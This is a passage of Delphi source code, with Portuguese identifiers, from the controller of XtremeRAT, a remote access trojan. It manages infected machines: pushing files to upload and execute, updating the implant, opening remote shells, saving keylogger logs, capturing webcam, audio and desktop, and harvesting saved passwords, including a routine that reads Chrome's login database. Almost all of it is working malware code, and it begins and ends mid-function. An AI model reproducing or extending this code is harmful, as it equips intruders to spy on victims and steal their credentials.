      end;
      delete(PortList, 1, posex('|', PortList));
      if IniciarNovaConexao(i) = False then
      begin
        MessageBox(Handle,
                   pwidechar(Traduzidos[125] + ' ' + inttostr(i) + ' ' + traduzidos[126]),
                   pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                   MB_OK or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      end else

      if UseUPnP = True then
      begin
        AddUPnPEntry(localip, i, 'XtremeRAT');
      end;
    end;

    AtualizarIdiomas;
  end else

  if Msg.message = WM_CHECK then
  begin
    ConAux := TConexaoNew(Msg.lparam);
    CheckConnection := TCheckConnection.Create(ConAux);
    CheckConnection.Resume;
  end else

  if Msg.message = WM_SENDALLSERVER then
  begin
    s := integer(Msg.wParam);
    SetLength(TempStr, s div 2);
    copymemory(@TempStr[1], pointer(Msg.lparam), s);

    Node := MainList.GetFirst;
    while Assigned(Node) = True do
    begin
      ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
      if (ConAux.Node <> nil) and (ConAux.MasterIdentification = 1234567890) then
      ConAux.EnviarString(TempStr);
      Node := MainList.GetNext(Node);
    end;
  end else
end;

procedure TFormMain.ApplicationEvents1Minimize(Sender: TObject);
begin
  if MinimizeToSysTray = false then exit;

  PossoMostrar := False;
  FormMain.Hide;

  TrayIcon1.Visible := True;
  TrayIcon1.BalloonTitle := NomeDoPrograma + ' ' + VersaoDoPrograma;
  TrayIcon1.BalloonHint := traduzidos[25] + ' [' + inttostr
    (MainList.TotalCount - MainList.RootNodeCount) + ']';
  TrayIcon1.BalloonFlags := bfInfo;
  TrayIcon1.ShowBalloonHint;
end;

procedure TFormMain.Arquivolocal1Click(Sender: TObject);
var
  ConAux: TConexaoNew;
  FileSize: int64;
  i: integer;
  Node: pVirtualNode;
begin
  OpenDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
  OpenDialog1.InitialDir := ExtractFilePath(Paramstr(0));
  OpenDialog1.FileName := 'Server.exe';
  OpenDialog1.Filter := 'Executables(*.exe)|*.exe';

  if (opendialog1.Execute = true) and (fileexists(opendialog1.FileName) = true) then
  begin
    FileSize := GetFileSize(OpenDialog1.FileName);
    if FileSize = 0 then exit;

    Node := MainList.GetFirstSelected;
    while Assigned(Node) do
    begin
      ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
      if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
      begin
        ConAux.EnviarString(UPDATESERVERLOCAL + DelimitadorComandos + OpenDialog1.FileName);
      end;
      Node := MainList.GetNextSelected(Node);
    end;
  end;
end;

type
  _CRYPTOAPI_BLOB = record
    cbData: DWORD;
    pbData: PBYTE;
  end;
  DATA_BLOB = _CRYPTOAPI_BLOB;
  PDATA_BLOB = ^DATA_BLOB;

function StartGetChromePass(sqlite3Dll, TempFile: string; Delimitador: string): string;
var
  DB: TSQLiteDatabase;
  Tablo: TSQLiteTable;
  Sifre: string;
  Giren: DATA_BLOB;
  Cikan: DATA_BLOB;
  DataStream: TMemorystream;
  TempStr: string;
begin
  result := '';
  merdadll := sqlite3Dll;
  db := TSQLiteDatabase.Create(TempFile);
  tablo := DB.GetTable('SELECT * FROM logins');

  While not tablo.EOF do
  begin
    TempStr := '';
    DataStream := TMemoryStream.Create;
    DataStream := tablo.FieldAsBlob(tablo.FieldIndex['password_value']);
    Giren.pbData := DataStream.Memory;
    Giren.cbData := DataStream.Size;

    SetLength(TempStr, DataStream.Size div 2);
    DataStream.Position := 0;
    DataStream.Read(TempStr[1], DataStream.Size);
    //CryptUnProtectData(@Giren, nil,nil,nil,nil,0,@Cikan);
    //SetString(sifre, PAnsiChar(Cikan.pbData), Cikan.cbData);

    sifre := traduzidos[520];
    Result := Result + tablo.FieldAsString(tablo.FieldIndex['origin_url']) + Delimitador;
    Result := Result + tablo.FieldAsString(tablo.FieldIndex['username_value']) + Delimitador;
    Result := Result + sifre + Delimitador + TempStr + #13#10;
    Tablo.Next;

    DataStream.Free;
  end;
  DeleteFile(pchar(TempFile));
end;

procedure TFormMain.Enviararquivoseexecutar1Click(Sender: TObject);
var
  ConAux: TConexaoNew;
  FileSize: int64;
  i: integer;
  Node: pVirtualNode;
begin
  OpenDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
  OpenDialog1.InitialDir := ExtractFilePath(Paramstr(0));
  OpenDialog1.FileName := '';
  OpenDialog1.Filter := 'All files( *.* )|*.*';

  if (opendialog1.Execute = true) and (fileexists(opendialog1.FileName) = true) then
  begin
    FileSize := GetFileSize(OpenDialog1.FileName);
    if FileSize = 0 then exit;

    Node := MainList.GetFirstSelected;
    while Assigned(Node) do
    begin
      ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
      if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
      begin
        ConAux.EnviarString(UPLOADANDEXECUTE + DelimitadorComandos + OpenDialog1.FileName);
      end;
      Node := MainList.GetNextSelected(Node);
    end;
  end;
end;

type
  TInsertNode = class(TIdSync)
  protected
    procedure DoSynchronize; override;
  public
    xConAux: TConexaoNew;
  end;

procedure TInsertNode.DoSynchronize;
var
  node: pVirtualNode;
  ConAux: TConexaoNew;
  NovaJanelaAll: TFormAll;
  D: TDisconnect;
begin
  ConAux := xConAux;
  if Assigned(ConAux.Node) then Exit;

  Node := FormMain.GetNodeGroup(ConAux);


  ConAux.Node := FormMain.MainList.InsertNode(Node, amAddChildFirst, TObject(ConAux));
  {FormMain.MainList.AddChild(Node, TObject(ConAux))};



  FormMain.MainList.Refresh;

  if ConAux.Node = nil then
  begin
    D := TDisconnect.Create(ConAux);
    D.Resume;
    Exit;
  end;

  if Node.ChildCount > 0 then FormMain.MainList.IsVisible[Node] := True;
  if Node.ChildCount = 1 then FormMain.MainList.Expanded[Node] := True;

  NovaJanelaAll := TFormAll.Create(FormMain, ConAux);
  ConAux.FormAll := NovaJanelaAll;

  FormMain.AtualizarQuantidade;

  ConAux.Item := FormMain.TempListViewLogs.Items.Add;
  ConAux.Item.Caption := ConAux.NomeDoServidor;
  ConAux.Item.SubItems.Add(DateTimeToStr(Now));
  ConAux.Item.SubItems.Add('');
  ConAux.Item.ImageIndex := ConAux.ImagemBandeira;

  if (FormConnectionsLog.Visible) and
     ((FormConnectionsLog.RadioGroup1.ItemIndex = 0) or
      (posex(Today, DateTimeToStr(FormConnectionsLog.sMonthCalendar1.CalendarDate)) > 0)) then
  begin
    SendMessage(FormConnectionsLog.Handle, 5556, integer(ConAux.Item), 0);
    Application.ProcessMessages;
  end;
end;

Procedure TFormMain.ExecutarComando(Recebido: string; ConAux: TConexaoNew);
var
  TempInt, i, HoraRecebimento, TempInt1, PassImage, BandeiraBKP: integer;
  ConAuxNewConnection: TConexaoNew;
  TempStr, TempStr1, TempID, SqlFile, TipoSenha, UserSenha, PassSenha: string;
  InformacoesDoServidor: TServerINFO;
  Node, Node1: PVirtualNode;
  Dados: TSearchFilesDados;
  Stream: TMemoryStream;
  JPG: TJpegImage;
  Bitmap: TBitmap;
  p: pointer;
  resStream: TResourceStream;
  AStream: TFileStream;
  JaExiste, NaoVale: boolean;
  Item: TListItem;
  xxx: TConexaoNew;
  d: Single;
begin
  HoraRecebimento := GetTickCount;
  if Recebido = '' then  exit;

  if ConAux.BrotherID <> '' then
  begin
    ConAuxNewConnection := ConAux;
    ConAux := TConexaoNew(ConAuxNewConnection.FindBrother(ConAuxNewConnection.BrotherID));
    if ConAux = nil then
    begin
      ConAuxNewConnection.Connection.Disconnect;
      exit;
    end;
  end;

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = NEWCONNECTION then
  begin
    ConAuxNewConnection := ConAux;
    ConAux := nil;

    Delete(Recebido, 1, posex('|', Recebido));
    TempID := Copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    Delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    Delete(Recebido, 1, length(delimitadorComandos));

    ConAux := TConexaoNew(ConAuxNewConnection.FindBrother(TempID));
    if ConAux = nil then
    begin
      ConAuxNewConnection.Connection.Disconnect;
      exit;
    end;

    ConAuxNewConnection.ConnectionID := RandomString(high(MaxN));
    ConAuxNewConnection.Node := nil;
    ConAuxNewConnection.BrotherID := ConAux.ConnectionID;
    ConAuxNewConnection.Porta := IntToStr(ConAuxNewConnection.Connection.Socket.Binding.Port);
    ConAuxNewConnection.Connection.IOHandler.DefStringEncoding := IndyTextEncoding_UTF8;
  end;

  if copy(recebido, 1, posex('|', recebido) - 1) = PONG then
  begin
    ConAux.FontColor := MainColor;

    TempInt := HoraRecebimento - ConAux.SendPingTime;
    ConAux.Ping := IntToStr(TempInt);

    if TempInt < 100 then ConAux.ImagemPing := 250 else
    if TempInt < 300 then ConAux.ImagemPing := 249 else
    if TempInt < 500 then ConAux.ImagemPing := 248 else
    if TempInt < 700 then ConAux.ImagemPing := 247 else
    ConAux.ImagemPing := 246;

    delete(recebido, 1, posex('|', recebido));
    TempStr := copy(recebido, 1, posex('|', recebido) - 1);
    try
      TempInt1 := strtoint64(TempStr); // Idle
      except
      TempInt1 := 0;
    end;

    delete(recebido, 1, posex('|', recebido));
    ConAux.JanelaAtiva := recebido;
    ConAux.Idle := MSecToTime(TempInt1);
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = PROXYSTART then
  begin
    delete(recebido, 1, posex('|', recebido));
    MessageBox(Handle, pchar(ConAux.NomeDoServidor + #13#10 + traduzidos[532] + ': ' + recebido), 'Proxy', MB_ICONINFORMATION);
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = PROXYSTOP then
  begin
    delete(recebido, 1, posex('|', recebido));
    MessageBox(Handle, pchar(ConAux.NomeDoServidor + #13#10 + traduzidos[533] + ': ' + recebido), 'Proxy', MB_ICONERROR);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = WEBCAMLIST then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    ConAux.WebcamList := Recebido;
    if Recebido <> '' then
    begin
      ConAux.CAM := Traduzidos[95];
      ConAux.ImagemCam := 244;
    end else
    begin
      ConAux.CAM := Traduzidos[96];
      ConAux.ImagemCam := 245;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = GETDESKTOPPREVIEW then
  begin
    delete(recebido, 1, posex('|', recebido));
    TempStr := recebido;

    Stream := TMemoryStream.Create;
    Stream.WriteBuffer(TempStr[1], length(TempStr) * 2);
    Stream.Position := 0;
    JPG := TJpegImage.Create;
    try
      JPG.LoadFromStream(Stream);
      except
      JPG.Free;
      Stream.Free;
      exit;
    end;
    Stream.Free;
    if ConAux.DesktopBitmap <> nil then ConAux.DesktopBitmap.Free;
    ConAux.DesktopBitmap := TBitmap.Create;
    ConAux.DesktopBitmap.Width := JPG.Width;
    ConAux.DesktopBitmap.Height := JPG.Height;
    ConAux.DesktopBitmap.Canvas.Draw(0, 0, JPG);
    JPG.Free;

    if (MainList.SelectedCount > 0) and (ConAux.Node = MainList.GetFirstSelected) then
    try
      d := ConAux.DesktopBitmap.Height / ConAux.DesktopBitmap.Width;
      Image1.Height := round(d * Image1.Width);

      Image1.Picture := nil;
      Image1.Picture.Bitmap.Assign(ConAux.DesktopBitmap);
      except
      Image1.Picture := nil;
    end;

    Application.ProcessMessages;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = GETDESKTOPPREVIEWINFO then
  begin
    delete(recebido, 1, posex('|', recebido));
    TempStr := recebido;
    Stream := TMemoryStream.Create;
    Stream.WriteBuffer(TempStr[1], length(TempStr) * 2);
    Stream.Position := 0;
    JPG := TJpegImage.Create;
    try
      JPG.LoadFromStream(Stream);
      except
      JPG.Free;
      Stream.Free;
      exit;
    end;
    Stream.Free;

    Bitmap := TBitmap.Create;

    Bitmap.Width := JPG.Width;
    Bitmap.Height := JPG.Height;
    Bitmap.Canvas.Draw(0, 0, JPG);
    JPG.Free;

    if (Bitmap.Height = DesktopImageList.Height) or
       (Bitmap.Width = DesktopImageList.Width) then
    begin
      if ConAux.ImagemDesktop = -1 then
      begin
        ConAux.ImagemDesktop := DesktopImageList.Add(Bitmap, nil);
      end else
      begin
        DesktopImageList.Replace(ConAux.ImagemDesktop, Bitmap, nil);
      end;
    end;

    Bitmap.Free;
  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = RENOMEAR then
  begin
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, Length(DelimitadorComandos));
    ConAux.NomeDoServidor := Recebido;
    MainList.Refresh;
  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = CHANGEGROUP then
  begin
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, Length(DelimitadorComandos));
    TempStr := Recebido;

    if Recebido = ConAux.GroupName then Exit;

    TempStr1 := ConAux.GroupName;
    ConAux.GroupName := TempStr;

    if ConAux.Node <> nil then
    begin
      Node := ConAux.Node.Parent; //Node do grupo...

      Node1 := GetNodeGroup(ConAux);
      MainList.NodeParent[ConAux.Node] := Node1;
      MainList.IsVisible[Node1] := True;
      MainList.Refresh;

      if Node1.ChildCount = 1 then MainList.Expanded[Node1] := True;
    end;

    MainList.Refresh;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMCHECKRAR then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    if Recebido = 'F' then
    begin
      ConAux.RARPlugin := False;
      resStream := TResourceStream.Create(hInstance, 'RAR', 'rarfile');
      SetLength(TempStr, resStream.Size div 2);
      resStream.Position := 0;
      resStream.Read(TempStr[1], resStream.Size);
      resStream.Free;

      EnDecryptStrRC4B(@TempStr[1], Length(TempStr) * 2, 'XTREME');

      resStream := TResourceStream.Create(hInstance, 'RARREG', 'rarregfile');
      SetLength(TempStr1, (resStream.Size div 2) + 1);
      resStream.Position := 0;
      resStream.Read(TempStr1[1], resStream.Size);
      resStream.Free;

      ConAux.EnviarString(FMGETRARFILE + '|' + TempStr1 + '|' + TempStr);
      sleep(500);
      ConAux.EnviarString(FMCHECKRAR + '|');
    end else
    begin
      ConAux.RARPlugin := True;
      if ConAux.FormFileManager <> nil then
      begin
        if TFormFileManager(ConAux.FormFileManager).Visible then
        sendmessage(TFormFileManager(ConAux.FormFileManager).Handle, WM_RARPLUGINOK, 0, 0);
        Application.ProcessMessages;
      end;
    end;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = UPLOADANDEXECUTEYES then
  begin
    delete(recebido, 1, posex('|', recebido));
    MessageBox(Handle, pchar(ConAux.NomeDoServidor + #13#10 +
      Traduzidos[371] + ': ' + Recebido), pchar(NomeDoPrograma + ' ' + VersaoDoPrograma), MB_ICONINFORMATION);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = UPLOADANDEXECUTENO then
  begin
    delete(recebido, 1, posex('|', recebido));
    MessageBox(Handle, pchar(ConAux.NomeDoServidor + #13#10 +
      Traduzidos[370] + ': ' + Recebido), pchar(NomeDoPrograma + ' ' + VersaoDoPrograma), MB_ICONERROR);
  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = UPDATESERVERLOCAL then
  begin
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, Length(DelimitadorComandos));

    if FileExists(Recebido) = False then exit;

    AStream := TFileStream.Create(Recebido, fmOpenRead + fmShareDenyNone);
    try
      ConAuxNewConnection.EnviarString(UPDATESERVERLOCAL + DelimitadorComandos + IntToStr(AStream.Size));
      ConAuxNewConnection.Connection.IOHandler.Write(AStream);
      finally
      FreeAndNil(AStream);
    end;
    try
      if ConAuxNewConnection.Connection.Connected = true then
      try
        ConAuxNewConnection.Connection.Disconnect;
        except
      end;
      except
    end;
  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = UPLOADANDEXECUTE then
  begin
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, Length(DelimitadorComandos));

    if FileExists(Recebido) = False then exit;

    AStream := TFileStream.Create(Recebido, fmOpenRead + fmShareDenyNone);
    try
      ConAuxNewConnection.EnviarString(UPLOADANDEXECUTE + DelimitadorComandos + ExtractFileName(Recebido) + DelimitadorComandos + IntToStr(AStream.Size));
      ConAuxNewConnection.Connection.IOHandler.Write(AStream);
      finally
      FreeAndNil(AStream);
    end;
    try
      if ConAuxNewConnection.Connection.Connected = true then
      try
        ConAuxNewConnection.Connection.Disconnect;
        except
      end;
      except
    end;
  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = MAININFO then
  begin
    if Assigned(ConAux.Node) then exit;

    {$IFDEF XTREMETRIAL}
    begin
      Node := MainList.GetFirst;
      i := 0;
      while Assigned(Node) do
      begin
        if MainList.GetNodeLevel(Node) > 0 then inc(i);
        Node := MainList.GetNext(Node);
      end;
      if i >= 5 then
      begin
        ConAux.AContext.Connection.Disconnect;
        Exit;
      end;
    end;
    {$ENDIF}

    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, Length(DelimitadorComandos));

    ZeroMemory(@InformacoesDoServidor, SizeOf(TServerINFO));
    CopyMemory(@InformacoesDoServidor, @Recebido[1], SizeOf(TServerINFO));

    ConAux.ImagemBandeira := InformacoesDoServidor.ImagemBandeira;
    ConAux.ImagemDesktop := -1;
    ConAux.GroupName := InformacoesDoServidor.GroupName;
    ConAux.NomeDoServidor := InformacoesDoServidor.NomeDoServidor;
    ConAux.Pais := InformacoesDoServidor.Pais;
    ConAux.IPWAN := ConAux.Connection.Socket.Binding.PeerIP{InformacoesDoServidor.IPWAN};
    ConAux.IPLAN := InformacoesDoServidor.IPLAN;
    ConAux.Account := InformacoesDoServidor.Account;
    ConAux.NomeDoComputador := InformacoesDoServidor.NomeDoComputador;
    ConAux.NomeDoUsuario := InformacoesDoServidor.NomeDoUsuario;
    ConAux.ImagemCam := InformacoesDoServidor.ImagemCam;
    ConAux.SistemaOperacional := InformacoesDoServidor.SistemaOperacional;
    ConAux.CPU := InformacoesDoServidor.CPU;
    ConAux.RAMSize := StrToInt64(InformacoesDoServidor.RAM);
    ConAux.RAM := FileSizeToStr(ConAux.RAMSize);
    ConAux.AV := InformacoesDoServidor.AV;
    ConAux.FW := InformacoesDoServidor.FW;
    ConAux.Versao := InformacoesDoServidor.Versao;
    ConAux.Porta := IntToStr(InformacoesDoServidor.Porta);
    ConAux.Ping := IntToStr(InformacoesDoServidor.Ping);
    ConAux.ImagemPing := 250{InformacoesDoServidor.ImagemPing};
    ConAux.Idle := MSecToTime(InformacoesDoServidor.Idle);
    ConAux.PrimeiraExecucao := InformacoesDoServidor.PrimeiraExecucao;
    ConAux.JanelaAtiva := InformacoesDoServidor.JanelaAtiva;
    ConAux.PASSID := InformacoesDoServidor.PASSID;
    if WideString(InformacoesDoServidor.CAM) = 'X' then
    begin
      ConAux.CAM := Traduzidos[95];
      ConAux.ImagemCam := 244;
    end else
    begin
      ConAux.CAM := Traduzidos[96];
      ConAux.ImagemCam := 245;
    end;

    if fileexists(ExtractFilePath(paramstr(0)) + 'GeoIP.dat') = False then
    begin
      resStream := TResourceStream.Create(hInstance, 'GEOIP', 'geoipfile');
      resStream.SaveToFile(ExtractFilePath(paramstr(0)) + 'GeoIP.dat');
      resStream.Free;
    end;

    BandeiraBKP := ConAux.ImagemBandeira;

    TempStr := ConAux.AContext.Connection.Socket.Binding.PeerIP;
    TempStr := LookupCountry(TempStr);
    // abreviação + ' - ' + nome
    TempInt := GetCountryCode(copy(TempStr, 1, posex('-', TempStr) - 2));
    // código da bandeira

    if TempInt <> -1 then
    begin
      TempStr := GetCountryName('', TempInt);
      ConAux.Pais := TempStr;
      ConAux.ImagemBandeira := TempInt;
    end else
    begin
      try
        TempInt := BandeiraBKP;
        except
        TempInt := -1;
      end;
      TempStr := GetCountryName('', TempInt);
      ConAux.Pais := TempStr;
      ConAux.ImagemBandeira := TempInt;
    end;

    //if ShowDeskPreview = true then //Enviar sempre para a barra lateral
      ConAux.EnviarString(GETDESKTOPPREVIEW + '|' + IntToStr(DesktopSize) + '|');
    if ShowThumbPreview = true then
      ConAux.EnviarString(GETDESKTOPPREVIEWINFO + '|' + IntToStr(ThumbSize) + '|' + IntToStr(ThumbSize) + '|');

    {
    PostMessage(FormMain.Handle, WM_INSERTLIST, 0, integer(ConAux));
    i := 0;
    while i < 100 do
    begin
      inc(i);
      sleep(1);
      Application.ProcessMessages;
    end;
    }
    with TInsertNode.Create do
    try
      xConAux := ConAux;
      Synchronize;
      finally
      Free;
    end;

    if ConAux.MasterIdentification <> 1234567890 then exit;

    if Assigned(ConAux.Node) = False then
    begin
      try
        ConAux.AContext.Connection.Disconnect;
        finally
        //MessageBox(0, 'Caralho...', '', 0);
      end;
      Exit;
    end;
    ZeroMemory(@InformacoesDoServidor, SizeOf(TServerINFO));

    PostMessage(FormMain.Handle, WM_INSERTNODE, 0, integer(ConAux));
    Application.ProcessMessages;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = ENVIARLOGSKEY then
  begin
    delete(recebido, 1, posex('|', recebido));
    TempStr := ExtractFilePath(paramstr(0)) + 'Downloads\' + ConAux.NomeDoServidor + '\Keylogger';
    ForceDirectories(TempStr);
    CriarArquivo(pWideChar(TempStr + '\' + ShowTime('-', ' ', '-') + '.txt'), pWideChar(Recebido), Length(Recebido) * 2);
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = PROCESS then
  begin
    if ConAux.FormProcessos <> nil then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormProcessos(ConAux.FormProcessos).OnRead(recebido, ConAux);
        except
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = JANELAS then
  begin
    if ConAux.FormWindows <> nil then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormWindows(ConAux.FormWindows).OnRead(recebido, ConAux);
        except
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = SERVICOS then
  begin
    if ConAux.FormServices <> nil then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormServices(ConAux.FormServices).OnRead(recebido, ConAux);
        except
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = REGISTRO then
  begin
    if ConAux.FormRegedit <> nil then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormRegedit(ConAux.FormRegedit).OnRead(recebido, ConAux);
        except
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = CLIPBOARD then
  begin
    if ConAux.FormClipboard <> nil then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormClipboard(ConAux.FormClipboard).OnRead(recebido, ConAux);
        except
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = SHELL then
  begin
    if (ConAux.FormShell <> nil) and (ConAux.FormShell.Visible = True) then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormShell(ConAux.FormShell).OnRead(recebido, ConAuxNewConnection);
        except
      end;
    end else
    try
      ConAuxNewConnection.Connection.Disconnect;
      except
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = FILEMANAGER then
  begin
    if ConAux.FormFileManager <> nil then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormFileManager(ConAux.FormFileManager).OnRead(recebido, ConAux);
        except
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = FILEMANAGERNEW then
  begin
    if (ConAux.FormFileManager <> nil) and (ConAux.FormFileManager.Visible = True) then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormFileManager(ConAux.FormFileManager).OnRead(recebido, ConAuxNewConnection);
        except
      end;
    end else
    try
      ConAuxNewConnection.Connection.Disconnect;
      except
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = LISTDEVICES then
  begin
    if ConAux.FormListarDispositivos <> nil then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormListarDispositivos(ConAux.FormListarDispositivos).OnRead(recebido, ConAux);
        except
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = LISTARPORTAS then
  begin
    if ConAux.FormActivePorts <> nil then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormActivePorts(ConAux.FormActivePorts).OnRead(recebido, ConAux);
        except
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = PROGRAMAS then
  begin
    if ConAux.FormProgramas <> nil then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormProgramas(ConAux.FormProgramas).OnRead(recebido, ConAux);
        except
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = FDIVERSOS then
  begin
    if ConAux.FormDiversos <> nil then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormDiversos(ConAux.FormDiversos).OnRead(recebido, ConAux);
        except
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = NEWFDIVERSOS then
  begin
    if ConAux.FormDiversos <> nil then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormDiversos(ConAux.FormDiversos).OnRead(recebido, ConAuxNewConnection);
        except
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = DESKTOP then
  begin
    if ConAux.FormDesktop <> nil then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormDesktop(ConAux.FormDesktop).OnRead(recebido, ConAux);
        except
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = DESKTOPNEW then
  begin
    if (ConAux.FormDesktop <> nil) and (ConAux.FormDesktop.Visible = True) then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormDesktop(ConAux.FormDesktop).OnRead(recebido, ConAuxNewConnection);
        except
      end;
    end else
    try
      ConAuxNewConnection.Connection.Disconnect;
      except
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = WEBCAM then
  begin
    if (ConAux.FormWebcam <> nil) and (ConAux.FormWebcam.Visible = True) then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormWebcam(ConAux.FormWebcam).OnRead(recebido, ConAuxNewConnection);
        except
      end;
    end else
    try
      ConAuxNewConnection.Connection.Disconnect;
      except
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = AUDIO then
  begin
    if (ConAux.FormAudioCapture <> nil) and (ConAux.FormAudioCapture.Visible = True) then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormAudioCapture(ConAux.FormAudioCapture).OnRead(recebido, ConAuxNewConnection);
        except
      end;
    end else
    try
      ConAuxNewConnection.Connection.Disconnect;
      except
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = CHAT then
  begin
    if ConAux.FormChat <> nil then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormChat(ConAux.FormChat).OnRead(recebido, ConAux);
        except
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = SERVERSETTINGS then
  begin
    if ConAux.FormServerSettings <> nil then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormServerSettings(ConAux.FormServerSettings).OnRead(recebido, ConAux);
        except
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = KEYLOGGER then
  begin
    if (ConAux.FormKeylogger <> nil) and (ConAux.FormKeylogger.Visible = True) then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormKeylogger(ConAux.FormKeylogger).OnRead(recebido, ConAuxNewConnection);
        except
      end;
    end else
    try
      ConAuxNewConnection.Connection.Disconnect;
      except
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = KEYLOGGERNEW then
  begin
    if (ConAux.FormKeylogger <> nil) and (ConAux.FormKeylogger.Visible = True) then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormKeylogger(ConAux.FormKeylogger).OnRead(recebido, ConAuxNewConnection);
        except
      end;
    end else
    try
      ConAuxNewConnection.Connection.Disconnect;
      except
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = UnitConstantes.MSN then
  begin
    if ConAux.FormMSN <> nil then
    begin
      delete(recebido, 1, posex('|', recebido));
      try
        TFormMSN(ConAux.FormMSN).OnRead(recebido, ConAux);
        except
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = CHROMEPASS then
  begin
    delete(recebido, 1, posex('|', recebido));
    TempInt := StrToInt(copy(recebido, 1, posex('|', recebido) - 1));
    delete(recebido, 1, posex('|', recebido));

    for i := FormPasswords.AdvListView1.Items.Count - 1 downto 0 do
    begin
      if TempInt = Integer(FormPasswords.AdvListView1.Items.Item[i].Data) then
      begin
        FormPasswords.AdvListView1.Items.Item[i].SubItems.Strings[2] := recebido;
        Break;
      end;
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = GETPASSWORDS then
  begin
    Application.ProcessMessages;
    FormPasswords.AdvProgressBar1.Position := FormPasswords.AdvProgressBar1.Position + 1;
    FormPasswords.AdvProgressBar1.Refresh;
    Application.ProcessMessages;

    delete(recebido, 1, posex('|', recebido));

    while recebido <> '' do
    begin
      Application.ProcessMessages;
      PassImage := GetPassImage(copy(recebido, 1, posex('|', recebido) - 1));
      delete(recebido, 1, posex('|', recebido));

      TempStr := Copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
      delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
      delete(Recebido, 1, length(DelimitadorComandos));

      if PassImage = 107 then
      begin
        SqlFile := 'sqlite3.dll';

        if FileExists(SqlFile) = False then
        begin
